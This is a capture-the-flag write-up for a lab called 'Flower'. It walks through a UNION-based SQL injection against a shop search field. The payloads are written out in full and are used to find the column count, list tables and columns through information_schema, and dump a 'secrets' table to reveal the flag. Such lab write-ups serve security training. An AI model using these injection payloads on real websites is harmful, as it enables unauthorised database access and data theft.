# Flower Writeup

I started by exploring the entire website to understand its site map and test its normal functionalities. I found multiple possible injectable inputs. Among all the possible injectable inputs, one stood out during testing.

The test on the **Search the Shop** functionality indicated an SQL error. This means that the website can interpret our input as SQL syntax. The first test displayed an error indicating an incorrect number of columns.

![error](./images/flower3.png)

Passing the following payload produced an output:

```sql
' UNION SELECT NULL,NULL,NULL,NULL -- -
```

![sqlinjectionconfirmed](./images/flower1.png)

The output was displayed, confirming that the query contains four columns.

Now, let's check which columns are reflected on the website by passing the following syntax:

```sql
' UNION SELECT 1,2,3,4 -- -
```

![reflected](./images/flower2.png)

This will determine where we can place our SQL syntax to fetch the desired data.

We can now retrieve the table names in the database and display the output in the desired column on the website by using the following payload:

```sql
' UNION SELECT 1, GROUP_CONCAT(table_name), 3, 4 FROM information_schema.tables WHERE table_schema = DATABASE() -- -
```

![tables](./images/flower4.png)

It is now confirmed that the database contains the following tables: `cart_items`, `flowers`, `messages`, `secrets`, and `users`.

We can proceed to retrieve the column names under the `secrets` table. Let's now pass our SQL injection payload:

```sql
' UNION SELECT 1, GROUP_CONCAT(column_name), 3, 4 FROM information_schema.columns WHERE table_name='secrets' -- -
```

![columns](./images/flower5.png)

The columns indicated are `id`, `key`, and `value`. This might indicate that the secret could be exposed in the `value` column.

To get the flag, we fetch the values from the `value` column indicated in the `secrets` table by injecting the following SQL syntax:

```sql
' UNION SELECT 1, GROUP_CONCAT(id,value), 3, 4 FROM secrets -- -
```

As we can see, the flag `WEBVERSE{…}` is now displayed on the website.

![flag](./images/flower6.png)
